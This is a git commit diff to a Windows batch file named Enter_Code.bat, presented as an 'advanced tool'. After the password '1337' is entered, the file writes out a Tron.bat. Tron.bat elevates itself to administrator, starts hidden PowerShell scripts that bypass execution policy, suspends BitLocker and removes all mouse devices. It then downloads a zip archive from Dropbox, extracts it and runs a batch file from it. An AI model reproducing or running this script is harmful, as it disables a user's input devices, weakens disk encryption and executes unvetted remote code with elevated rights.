eefa756c4c741cf0a97a058fd3552cfab98cedeb
23jrg <jrg71442@yahoo.com>
2026-05-20 16:05:50 -0400

    Update Enter_Code.bat

--- Tools/Advanced_Tools/Enter_Code.bat
+++ Tools/Advanced_Tools/Enter_Code.bat
@@ -9,8 +9,8 @@ if "%pass%"=="1337" (
 echo Access Granted!
 echo > Tron.bat
 echo FSUTIL DIRTY query ^%SystemDrive% ^>NUL ^|^| (PowerShell "Start-Process -FilePath '%0' -Verb RunAs" ^EXIT^) >> Tron.bat
-echo start "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\23jrg\Quantum-Impeller\Volume.ps1" >> Tron.bat
-echo start "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\23jrg\Quantum-Impeller\Music.ps1" >> Tron.bat
+echo start PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\23jrg\Quantum-Impeller\Volume.ps1" >> Tron.bat
+echo start PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\23jrg\Quantum-Impeller\Music.ps1" >> Tron.bat
 echo start cmd /k "color 2&&curl ascii.live/knot" >> Tron.bat
 echo powershell -Command "Suspend-BitLocker -MountPoint 'C:' -RebootCount 1;Caffeine -replace;foreach ($dev in (Get-PnpDevice | Where-Object{$_.Class -eq 'Mouse'})) {&'pnputil' /remove-device $dev.InstanceId};curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/l1i47sufwu8oq9gfomxzd/AH0AlovhO_R5M1hd3_JyIgk?rlkey=o5of9srrq12e6e6jxp324n186&st=yowokjft&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools;Start-Process 'cmd.exe' -ArgumentList '/c C:\23jrg\Quantum-Impeller\tools\tron\tron.bat' -WindowStyle Maximized;" >> Tron.bat
 
